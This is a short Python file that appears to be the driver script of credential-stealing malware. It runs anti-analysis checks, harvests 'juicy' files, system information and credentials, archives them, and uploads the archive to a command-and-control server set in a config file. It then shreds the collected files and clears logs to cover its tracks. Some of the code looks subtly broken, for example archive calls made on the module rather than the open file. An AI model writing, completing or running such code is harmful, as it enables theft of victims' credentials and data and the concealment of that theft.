import tarfile
from src.utils import *
from src.anti import *
from src.file import *
from src.info import *
from src.creds import *
from src.config import *

print('> Executing anti-* library')
Anti().start_check()

print('> Checks passed, starting file scanner') # collect juicy files
File().scan()

print('> Collecting system information')
Info().scan()

print('> Collecting credentials')
Credentials().scan()

print('> Appending files to tar file')
grabbed_files = []
for root, dirs, files in os.walk('pictures'):
    for file in files:
        grabbed_files.append(os.path.join(root, file))

with tarfile.open(cfg.datafile, 'w:xz'):
    for file in grabbed_files:
        tarfile.add(file)

    tarfile.add('info.json')

print(f'> Uploading to {cfg.cnc}')
Utils().upload(cfg.datafile, cfg.cnc)

print('> Shredding files')
for file in grabbed_files:
    Utils().shred(file)
Utils().shred('info.json')

print('> Removing myself')
Utils().clearLogs()